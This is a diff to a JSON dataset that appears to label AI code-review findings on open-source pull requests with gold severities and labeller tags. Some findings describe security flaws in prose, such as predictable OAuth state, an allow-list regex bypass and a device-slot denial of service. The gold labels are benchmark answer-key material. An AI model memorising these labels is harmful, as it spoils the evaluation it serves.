+   "labelBy": "astra"
   },
   {
    "issueId": "feat-add-calendar-cache-status-and-actions-22532-cal-com#08",
@@ -1508,13 +1697,14 @@
     "relevantLinesStart": 24,
     "relevantLinesEnd": 26,
     "suggestionContent": "A plain `Error` is thrown when the credential is missing or not owned by the user. tRPC turns this into a 500 INTERNAL_SERVER_ERROR and logs it as a server fault, instead of returning a proper client error. Throw `new TRPCError({ code: \"NOT_FOUND\", message: \"Credential not found or access denied\" })` (or FORBIDDEN) instead."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#08",
    "caseId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1524,7 +1714,9 @@
     "relevantLinesStart": 91,
     "relevantLinesEnd": 93,
     "suggestionContent": "`registerIDPLoginInvalidationOnUpdate` gets `original` from `getById()`, which returns the org-aware wrapper whose `isEnabled()` is false whenever the linked org (or the organization feature) is disabled. If an org IDP is set to hideOnLogin/linkOnly while its org is disabled, both predicate checks return false and the login caches are not invalidated, yet those caches (built from the delegate, which ignores org enabled state) still hold the IDP. After the org is re-enabled, the hidden or link-only IDP shows on the login page, because the bean only re-checks `isEnabled()`. Fix: compare against the unwrapped stored model (e.g. `idpDelegate.getById(model.getInternalId())`) when deciding whether to invalidate."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-client-resource-type-and-scopes-to-authorization-schema-keycloak#opa-02",
@@ -1539,12 +1731,14 @@
     "relevantLinesStart": 147,
     "relevantLinesEnd": 150,
     "suggestionContent": "WHAT: canExchangeTo throws UnsupportedOperationException instead of returning boolean. WHY: Caller AbstractTokenExchangeProvider expects a boolean deny/allow and will propagate 500 on every token-exchange when V2 is enabled, breaking the contract that V1 satisfies by returning false. HOW: Return false (or implement V2 evaluation) instead of throwing."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#16",
    "caseId": "oauth-credential-sync-and-app-integration-enhancements-cal-com",
-   "severity": "high",
+   "severity": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1554,13 +1748,14 @@
     "relevantLinesStart": 75,
     "relevantLinesEnd": 87,
     "suggestionContent": "WHAT: Error check uses response.statusText !== 'OK' instead of response.ok/status. WHY: statusText is empty/unreliable in node-fetch/undici, causing false failures or missed HTTP errors on Salesforce refresh. HOW: Check !response.ok or status code range."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "ux-show-complete-url-path-if-website-domain-is-same-as-instance-domain-discourse-cursor#07",
    "caseId": "ux-show-complete-url-path-if-website-domain-is-same-as-instance-domain-discourse-cursor",
-   "severity": "medium",
-   "severityBefore": "high",
+   "severity": "low",
    "classReviewed": "TP",
    "category": "api",
    "label": "bug",
@@ -1570,12 +1765,14 @@
     "relevantLinesStart": 153,
     "relevantLinesEnd": 155,
     "suggestionContent": "WHAT: the conditional-inclusion predicate is named `include_website_name` without the trailing `?` that ActiveModel::Serializer requires (every other predicate in this serializer is generated as `include_#{attr}?`, and spec/serializers/user_serializer_spec.rb:11-15 relies on that `?` form for the untrusted attributes).\nWHY: AMS looks up `include_website_name?`, finds no such method, and defaults to include => true, so this method is dead code and `website_name` is serialized for every user even when `website` is blank (emitting a spurious `website_name: null`) and regardless of the intended `website.present?` guard.\nHOW: rename the method to `def include_website_name?` (matching the framework convention used by the other predicates) so AMS actually honors the `website.present?` check."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "comprehensive-workflow-reminder-management-for-booking-lifecycle-events-cal-com#prod-01",
    "caseId": "comprehensive-workflow-reminder-management-for-booking-lifecycle-events-cal-com",
-   "severity": "high",
+   "severity": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1585,7 +1782,9 @@
     "relevantLinesStart": 57,
     "relevantLinesEnd": 59,
     "suggestionContent": "The cron route configures `sgMail` but not the separately imported `@sendgrid/client`, so the new `client.request` cancellation calls lack SendGrid authentication and leave canceled booking reminders scheduled. Initialize `client` with `sendgridAPIKey`, as `emailReminderManager.ts` already does."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "github-oauth-security-enhancement-sentry#03",
@@ -1600,7 +1799,9 @@
     "relevantLinesStart": 402,
     "relevantLinesEnd": 413,
     "suggestionContent": "OAuth state is set to pipeline.signature, which is a deterministic md5 of the pipeline view class names and therefore predictable and shared across all users/sessions. This defeats the CSRF protection of the OAuth callback and allows an attacker who can start a pipeline to forge a valid callback with their own authorization code, bypassing the new installer-vs-authenticated-user validation. Generate a per-session nonce (e.g., secrets.token_hex()), bind it to pipeline state, and compare the returned state against that stored value, as OAuth2LoginView does."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "dual-storage-architecture-grafana-codex#06",
@@ -1615,7 +1816,9 @@
     "relevantLinesStart": 139,
     "relevantLinesEnd": 139,
     "suggestionContent": "Legacy.Update now receives the original objInfo rather than an updateWrapper containing the object committed to unified storage. Playlist legacyStorage.Update invokes objInfo.UpdatedObject against its own old object, so a patch is recomputed against potentially stale legacy data and can produce a different result or fail even after the unified update succeeds. Pass an updateWrapper with upstream: objInfo and updated: res to the legacy update."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-workflow-engine-add-in-hook-for-producing-occurrences-from-the-stateful-det-sentry#02",
@@ -1630,13 +1833,14 @@
     "relevantLinesStart": 10,
     "relevantLinesEnd": 12,
     "suggestionContent": "WHAT: `MetricAlertDetectorHandler` subclasses `StatefulDetectorHandler` but does not implement any of its abstract methods (`counter_names`, `get_dedupe_value`, `get_group_key_values`, `build_occurrence_and_event_data`).\nWHY: `MetricAlertFire.detector_handler = MetricAlertDetectorHandler`, and `Detector.detector_handler` instantiates it with `group_type.detector_handler(self)`, so any `metric_alert_fire` detector will crash with `TypeError: Can't instantiate abstract class` when processed.\nHOW: Implement the required abstract methods on `MetricAlertDetectorHandler`, or keep it extending `DetectorHandler` until the stateful abstraction is fully built out."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "replays-self-serve-bulk-delete-system-sentry#02",
    "caseId": "replays-self-serve-bulk-delete-system-sentry",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "TP",
    "category": "security",
    "label": "security",
@@ -1646,7 +1850,9 @@
     "relevantLinesStart": 111,
     "relevantLinesEnd": 114,
     "suggestionContent": "The new validation-failure warning logs `raw_report`, the full unvalidated report object supplied by the caller. This endpoint is public and unauthenticated (permission_classes = (), @csrf_exempt), so the payload is attacker-controlled, and browser report bodies routinely carry sensitive values (CSP blocked-uri/document-uri/script-sample, sourceFile, plus the full user_agent). Logging the raw payload on every validation failure writes potentially sensitive data into application logs; log only the report `type` (or a sanitized/redacted subset) instead of the entire raw object."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "dual-storage-architecture-grafana-codex#05",
@@ -1661,13 +1867,14 @@
     "relevantLinesStart": 50,
     "relevantLinesEnd": 57,
     "suggestionContent": "WHAT: The async legacy-write goroutines derive their context via `context.WithTimeoutCause(ctx, ...)` from the request-scoped `ctx` handed to Create (same at lines 108-114, 134-141, 161-167). WHY: The k8s apiserver cancels the request context as soon as the handler returns, which occurs immediately after the goroutine is spawned; the derived context is therefore already Done, so Legacy.Create/Delete/Update/DeleteCollection fail with context.Canceled and the best-effort legacy mirror — mode 3's entire purpose — silently never happens. HOW: detach the goroutine from the request context, e.g. build a fresh context (`context.WithTimeout(context.Background(), 10*time.Second)`) and copy only the logger/values needed by the legacy store before launching the goroutine."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#05",
    "caseId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "FP nit",
    "category": "concurrency",
    "label": "bug",
@@ -1677,7 +1884,9 @@
     "relevantLinesStart": 236,
     "relevantLinesEnd": 240,
     "suggestionContent": "Do not merge the previously read query into a newly revisioned entry without verifying its revision. A reader can obtain a query containing organization A's IDs, then another transaction disables a provider or changes its organization and invalidates this key. When the reader requests an uncached organization B, this branch obtains a fresh revision but copies the old A results into the new query and publishes it using the current counter. Subsequent A requests receive stale membership indefinitely (a disabled or moved provider still exists, so the null-ID fallback does not repair it). Rebuild rather than copy after invalidation, or ensure the old query's revision is still valid atomically before publishing the merged entry."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#sncc-03",
@@ -1692,7 +1901,9 @@
     "relevantLinesStart": 4,
     "relevantLinesEnd": 4,
     "suggestionContent": "The layout requests the 'embed' stylesheet, but config/application.rb's assets.precompile list (not touched by this PR) does not include 'embed.css' or 'embed.js'. With precompiled assets in production, the embed iframe layout will fail to resolve the stylesheet and embed.js will not be served. Add 'embed.css' and 'embed.js' to config.assets.precompile."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#14",
@@ -1707,7 +1918,9 @@
     "relevantLinesStart": 145,
     "relevantLinesEnd": 154,
     "suggestionContent": "createEvent now picks the target calendar only by matching credentialId. Destination calendars without a credentialId (handled by EventManager's integration-based branch) never match, so events are inserted into \"primary\" instead of the configured destination externalId as before."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#03",
@@ -1722,7 +1935,9 @@
     "relevantLinesStart": 133,
     "relevantLinesEnd": 135,
     "suggestionContent": "When a date override exists for the slot's day and the slot falls inside it, `return true` exits before the `busy.every(...)` check runs. On any day with a date override, slots that overlap existing bookings or calendar events are still offered, which allows double bookings. Only skip the working-hours check in this case and still check `busy` (e.g. `if (!dateOverrideExist && workingHours.find(...)) return false;`, then continue to the busy check)."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#07",
@@ -1737,7 +1952,9 @@
     "relevantLinesStart": 140,
     "relevantLinesEnd": 146,
     "suggestionContent": "A weekday with no matching working-hours entry falls through to the busy checks and is treated as available when there are no conflicts. In round-robin events, slots generated for a loose host can consequently include a fixed host whose schedule excludes that day. Reject slots unless a working-hours interval on the slot's weekday contains the event, when no date override applies."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "replays-self-serve-bulk-delete-system-sentry#12",
@@ -1752,12 +1969,14 @@
     "relevantLinesStart": 164,
     "relevantLinesEnd": 174,
     "suggestionContent": "WHAT: use-table-widget-visualization branch renders hardcoded empty columns={[]} and tableData {data:[],meta:{fields:{},units:{}}} ignoring result/data/meta. WHY: dashboards show an empty table with no columns instead of real query results when flag is on; [] also suppresses the columns fallback. HOW: pass through actual result data/meta and derived columns."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry#07",
    "caseId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry",
-   "severity": "high",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1767,7 +1986,9 @@
     "relevantLinesStart": 71,
     "relevantLinesEnd": 71,
     "suggestionContent": "enable_advanced dereferences organization_context.member.has_global_access, but RpcUserOrganizationContext.member is Optional (`RpcOrganizationMember | None = None`, organization/services/organization/model.py:346). For a non-superuser request where member is None, this raises AttributeError before pagination runs. Fix: guard with `member is not None and member.has_global_access` (or `getattr(organization_context.member, 'has_global_access', False)`)."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#13",
@@ -1782,7 +2003,9 @@
     "relevantLinesStart": 449,
     "relevantLinesEnd": 468,
     "suggestionContent": "With multiple calendar references now possible, the recurring-event cancellation loop uses updBooking.references.find(...) and only deletes the first _calendar reference per booking. Iterate over all matching calendar references so collective recurring events do not leave stale calendar events."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#02",
@@ -1797,7 +2020,9 @@
     "relevantLinesStart": 70,
     "relevantLinesEnd": 78,
     "suggestionContent": "WHAT: `blacklistedGuestEmails` is built from lowercased env entries, but `uniqueGuests` compares the raw, non-lowercased `guest` against it (`!blacklistedGuestEmails.includes(guest)`). WHY: any guest email supplied with different casing (e.g. `Foo@Bar.com` vs blacklisted `foo@bar.com`) slips past BLACKLISTED_GUEST_EMAILS and is added to the booking/calendar, silently defeating the blacklist. HOW: normalize both sides, e.g. `blacklistedGuestEmails.includes(guest.toLowerCase())` (and compare attendee emails lowercased too)."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-authzclientcryptoprovider-for-authorization-client-cryptographic-operations-keycloak#04",
@@ -1812,7 +2037,9 @@
     "relevantLinesStart": 39,
     "relevantLinesEnd": 44,
     "suggestionContent": "WHAT: New abstract method int order() has no default, breaking all existing CryptoProvider implementations. WHY: Legacy providers on classpath throw AbstractMethodError when CryptoIntegration sorts by order, crashing init instead of loading. HOW: Change to default int order() { return 0; }."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "unified-storage-performance-optimizations-grafana-codex#02",
@@ -1827,7 +2054,9 @@
     "relevantLinesStart": 216,
     "relevantLinesEnd": 216,
     "suggestionContent": "The new TotalDocs call iterates bleveBackend.cache without a read lock after the watch-event consumer has already started. An event for a previously unindexed namespace/resource can concurrently publish an index through BuildIndex, causing a map iteration/write data race and potentially a fatal concurrent-map panic during initialization. Protect TotalDocs cache iteration with cacheMu.RLock/RUnlock."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#02",
@@ -1842,7 +2071,9 @@
     "relevantLinesStart": 114,
     "relevantLinesEnd": 116,
     "suggestionContent": "The condition compares two Dayjs objects with `===`, which is reference equality and is always false. A full-day unavailable override where start equals end will never be detected, so the slot will be incorrectly kept available."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "add-client-resource-type-and-scopes-to-authorization-schema-keycloak#musep-01",
@@ -1857,7 +2088,9 @@
     "relevantLinesStart": 214,
     "relevantLinesEnd": 222,
     "suggestionContent": "A global grant is silently ignored once any per-client resource exists, denying legitimate admins in `hasPermission(ClientModel, String)`. Check the per-client resource from `findByName` and then the all-clients type resource from `getResourceTypeResource` so either grant succeeds."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#12",
@@ -1872,7 +2105,9 @@
     "relevantLinesStart": 208,
     "relevantLinesEnd": 209,
     "suggestionContent": "WHAT: updateLocation builds referencesToCreate using `result.externalId` and `result.credentialId` from updateAllCalendarEvents results. WHY: CalendarManager.updateEvent returns an EventResult that does not include externalId or credentialId, so every updated calendar reference is written back with undefined externalCalendarId and credentialId, losing the calendar/credential linkage that was previously preserved from evt.destinationCalendar. HOW: Make CalendarManager.updateEvent return externalId and credentialId (as createEvent now does), or restore the evt.destinationCalendar fallback in updateLocation."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#03",
@@ -1887,7 +2122,9 @@
     "relevantLinesStart": 315,
     "relevantLinesEnd": 317,
     "suggestionContent": "WHAT: deleteEvent has the same dead fallback `find((cal) => cal.externalId === externalCalendarId)` in the else-branch. WHY: when externalCalendarId is absent the lookup compares against undefined and always yields undefined, so deletes fall back to \"primary\" instead of the stored destination calendar."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#04",
@@ -1902,7 +2139,9 @@
     "relevantLinesStart": 127,
     "relevantLinesEnd": 127,
     "suggestionContent": "The new V2 group-ID result is consumed by a JPA filtering implementation that still requires a legacy authorization resource named group.resource.<groupId>. UsersResource passes this result into JpaUserProvider search/count paths, whose groupsWithPermissionsSubquery checks for that legacy name, whereas the new schema creates resources named only by group ID; therefore V2-only group permissions cannot return or count their members even with correct group IDs. Update the JPA filtering contract to support V2 resource naming rather than requiring a V1 resource."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-authzclientcryptoprovider-for-authorization-client-cryptographic-operations-keycloak#05",
@@ -1917,7 +2156,9 @@
     "relevantLinesStart": 55,
     "relevantLinesEnd": 72,
     "suggestionContent": "WHAT: detectProvider sorts by order and silently picks first, but Default/Elytron/FIPS all return order 200 so ties fall back to nondeterministic ServiceLoader order. WHY: Classpath with both FIPS and non-FIPS providers no longer errors and can silently select non-compliant crypto, breaking FIPS compliance without warning."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-sql-analytics-framework-grafana-codex#oph-01",
@@ -1932,12 +2173,14 @@
     "relevantLinesStart": 194,
     "relevantLinesEnd": 200,
     "suggestionContent": "WHAT: `enableSqlExpressions` always returns false regardless of the `sqlExpressions` feature flag. WHY: It negates `IsEnabledGlobally` and then unconditionally returns false, so enabling the feature flag cannot turn SQL expressions on, breaking the flag's contract. HOW: Return the flag value directly (`return h.features.IsEnabledGlobally(featuremgmt.FlagSqlExpressions)`) if conditional gating is intended, or return `false` explicitly if the intent is to permanently disable."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#snloop-01",
    "caseId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak",
-   "severity": "high",
+   "severity": "low",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1947,7 +2190,9 @@
     "relevantLinesStart": null,
     "relevantLinesEnd": null,
     "suggestionContent": "hasPermission() uses the result of getResourceTypeResource() without a null check. The reviewer did not confirm that the type resource is always created, so this finding is less certain."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-per-topic-unsubscribe-option-in-emails-discourse-cursor#02",
@@ -1962,7 +2207,9 @@
     "relevantLinesStart": 105,
     "relevantLinesEnd": 111,
     "suggestionContent": "WHAT: TopicUser.find_by can return nil and then tu.notification_level is dereferenced without a guard. WHY: Causes NoMethodError 500 for users with no TopicUser row for the topic (also crashes if notification_level is nil since nil > Integer raises). HOW: Handle nil e.g. initialize via TopicUser.get/change or create the row before downgrading."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "notification-rule-processing-engine-grafana-codex#02",
@@ -1977,13 +2224,14 @@
     "relevantLinesStart": 165,
     "relevantLinesEnd": 175,
     "suggestionContent": "The Delete menu item is gated on truthy rulerRule. In the list view rulerRule is undefined, so the delete action never appears even when useAllGrafanaPromRuleAbilities reports delete as supported and allowed. Allow the delete menu item to render based on the promRule-derived ability when rulerRule is not available."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#08",
    "caseId": "oauth-credential-sync-and-app-integration-enhancements-cal-com",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1993,13 +2241,14 @@
     "relevantLinesStart": 5,
     "relevantLinesEnd": 11,
     "suggestionContent": "WHAT: in `minimumTokenResponseSchema` both computed keys `[z.string().toString()]` and `[z.string().optional().toString()]` evaluate to the same string `\"[object Object]\"` (Zod types do not override `toString`), so the second property definition silently overwrites the first. WHY: the intended \"any numeric property is the expiry\" requirement (z.number) is never applied — the schema only enforces `access_token`, so malformed token responses without a numeric expiry pass validation and downstream `expiry_date` handling breaks. HOW: use a proper catch-all (e.g. `z.record(z.unknown())` combined with `z.object({ access_token: z.string() }).passthrough()`) or explicit fields rather than computed property keys."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry#08",
    "caseId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -2009,7 +2258,9 @@
     "relevantLinesStart": 242,
     "relevantLinesEnd": 248,
     "suggestionContent": "The top-N path upsamples only the timeseries columns while leaving the selected fields and ranking aggregation as raw count(). discover.top_events_timeseries first selects the top groups using selected_columns and orderby, so a group with fewer stored events but a larger sample-weight total is excluded in favor of a lower weighted-count group. Apply the weighted count transformation consistently to the top-group selection and ranking as well as the timeseries query, preserving their public aliases."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#07",
@@ -2024,7 +2275,9 @@
     "relevantLinesStart": 25,
     "relevantLinesEnd": 27,
     "suggestionContent": "WHAT: `parseRefreshTokenResponse` unconditionally sets `refreshTokenResponse.data.refresh_token = \"refresh_token\"` whenever the parsed response has no `refresh_token`.\nWHY: `office365calendar` uses `refreshTokenResponseSchema` in which `refresh_token` is optional (CalendarService.ts:56) and then does `o365AuthCredentials = { ...o365AuthCredentials, ...tokenResponse.data }` (CalendarService.ts:264) before persisting. When the provider's refresh response omits `refresh_token`, this literal now overwrites the still-valid stored refresh token, so the next refresh attempt sends `refresh_token=\"refresh_token\"` and permanently fails — the previous raw `safeParse` path preserved the old refresh token. HOW: only inject the placeholder when the caller's flow actually needs it (sharing/sync path), e.g. pass a flag or restrict the injection to the `minimumTokenResponseSchema` branch, and never overwrite an existing `refresh_token` in the non-sharing branch."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#09",
@@ -2039,7 +2292,9 @@
     "relevantLinesStart": 165,
     "relevantLinesEnd": 171,
     "suggestionContent": "The attendees are written to the database at line 92, but `eventManager.updateCalendarAttendees` at line 165 runs outside the try/catch. If it throws, the mutation returns an error even though the guests are already persisted, so the DB and the calendar are out of sync. No emails are sent, and a retry then fails with 'emails_must_be_unique_valid'. Catch and handle the calendar update failure after the DB write."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#04",
@@ -2054,7 +2309,9 @@
     "relevantLinesStart": 24,
     "relevantLinesEnd": 25,
     "suggestionContent": "Legacy host values are inserted unchanged, bypassing the new model's scheme and path normalization. Existing values such as https://example.com/1234 consequently never match record_for_host's comparison against example.com, disabling embedding after upgrade. Normalize migrated values to the same representation used by the model before inserting them."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "anonymous-add-configurable-device-limit-grafana-codex#02",
@@ -2069,12 +2326,14 @@
     "relevantLinesStart": 44,
     "relevantLinesEnd": 47,
     "suggestionContent": "WHAT: Any unauthenticated caller can mint arbitrary X-Grafana-Device-Id values to fill the anon_device table up to the limit, after which legitimate anonymous users are denied (return nil, ErrDeviceLimitReached). WHY: Device IDs are attacker-controlled with no per-IP rate limit, proof-of-work, or privileged cleanup, enabling an anonymous slot-exhaustion DoS on anon login. HOW: Rate-limit device creation per IP, require a valid existing device for deny decisions, or fail-open with throttling instead of hard deny."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#10",
    "caseId": "add-guest-management-functionality-to-existing-bookings-cal-com",
-   "severity": "high",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": null,
    "label": "bug",
@@ -2084,7 +2343,9 @@
     "relevantLinesStart": 52,
     "relevantLinesEnd": 56,
     "suggestionContent": "WHAT: any attendee whose email matches ctx user is authorized to add arbitrary guests. WHY: lets a low-privilege attendee inject unlimited emails into any booking they attend, triggering calendar updates and invite emails containing meeting/video details to attacker-chosen addresses (spam-relay / unwanted-participant abuse). HOW: restrict to organizer/team roles or require organizer approval."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "anonymous-add-configurable-device-limit-grafana-codex#11",
@@ -2099,7 +2360,9 @@
     "relevantLinesStart": 1654,
     "relevantLinesEnd": 1654,
     "suggestionContent": "The new device_limit setting is read without adding a corresponding key to conf/defaults.ini. applyEnvVariableOverrides only visits keys already present in the loaded INI and runs before readAuthSettings, so setting GF_AUTH_ANONYMOUS_DEVICE_LIMIT alone is ignored and leaves the limit at zero, disabling enforcement. Add an uncommented device_limit = 0 entry under auth.anonymous in defaults.ini so the standard environment override mechanism can apply it."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "span-buffer-multiprocess-enhancement-with-health-monitoring-sentry#03",
@@ -2114,7 +2377,9 @@
     "relevantLinesStart": 253,
     "relevantLinesEnd": 257,
     "suggestionContent": "WHAT: `process.kill()` in `_ensure_processes_alive` is guarded by `isinstance(process, multiprocessing.Process)`, but the flusher processes are created via `self.mp_context.Process` with `mp_context = multiprocessing.get_context(\"spawn\")`, which produces a `multiprocessing.context.SpawnProcess`. `SpawnProcess` and `multiprocessing.Process` (= `multiprocessing.context.Process`) are sibling subclasses of `multiprocessing.process.BaseProcess`, so the isinstance test is False and `kill()` is never called. WHY: before this PR `self.process.kill()` was unconditional; now an unhealthy/hung flusher process is left alive while `_create_process_for_shards(process_index, shards)` immediately starts a new process for the same shard set, so two processes concurrently flush the same Redis shards -> duplicate segments produced to Kafka, and orphaned process accumulation until `process_restarts` exceeds MAX_PROCESS_RESTARTS and crashes the consumer. HOW: test against `multiprocessing.process.BaseProcess` (or the concrete `SpawnProcess` type, or `hasattr(process, 'kill')`) so real spawn processes are killed before restart/terminate."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#01",
@@ -2129,7 +2394,9 @@
     "relevantLinesStart": 141,
     "relevantLinesEnd": 143,
     "suggestionContent": "WHAT: Both `start` and `end` are computed from `slotStartTime.hour() * 60 + slotStartTime.minute()`, so they are identical. WHY: The working-hours check only validates the slot start time and ignores the slot end time, allowing slots that extend past the host's working hours to be marked available. HOW: Compute `end` from `slotEndTime.hour() * 60 + slotEndTime.minute()` so the entire slot is verified against `workingHour.startTime` and `workingHour.endTime`."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry#oph-01",
@@ -2144,13 +2411,14 @@
     "relevantLinesStart": 842,
     "relevantLinesEnd": 843,
     "suggestionContent": "OptimizedCursorPaginator.value_from_cursor returns cursor.value unchanged, whereas DateTimePaginator.value_from_cursor (lines 238-241) converts the numeric cursor back into a tz-aware datetime. The returned value is passed to BasePaginator.build_queryset as the parameter of a `datetime <op> %s` where-clause, so using a raw numeric value against the datetime column yields a wrong/invalid comparison on subsequent pages. Fix: inherit/duplicate DateTimePaginator's datetime conversion."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#19",
    "caseId": "enhance-embed-url-handling-and-validation-system-discourse-cursor",
    "severity": "medium",
-   "severityBefore": "high",
    "classReviewed": "TP",
    "category": null,
    "label": "bug",
@@ -2160,7 +2428,9 @@
     "relevantLinesStart": 52,
     "relevantLinesEnd": 52,
     "suggestionContent": "WHAT: `TopicEmbed.import_remote` passes `doc.title` and `doc.content` from `Readability::Document` straight into `TopicEmbed.import` without nil or empty guards.\nWHY: `TopicEmbed.import` calls `contents << ...`, so a nil `doc.content` raises `NoMethodError`; a nil `doc.title` reaches `PostCreator` with `skip_validations: true`, producing a topic/post with no title.\nHOW: Validate or default the Readability output before the call, e.g., reject the import when content is blank and supply a fallback title when `doc.title` is missing."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor#08",
@@ -2175,7 +2445,9 @@
     "relevantLinesStart": 18,
     "relevantLinesEnd": 22,
     "suggestionContent": "WHAT: email_in_restriction_setting? builds unanchored Regexp \"@(domains)\" with only '.' escaped. WHY: Whitelist 'gmail.com' substring-matches 'victim@gmail.com.evil.com', so an attacker registers with an unapproved domain and bypasses the allow-list; blacklist similarly over/under-matches and other regex metachars are unescaped. HOW: Anchor and escape domains (e.g. Regexp.escape per domain split on '|' plus /\\A[^@\\s]+@(?:domain)\\z/i)."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-automatically-downsize-large-images-discourse-cursor#03",
@@ -2190,7 +2462,9 @@
     "relevantLinesStart": 63,
     "relevantLinesEnd": 69,
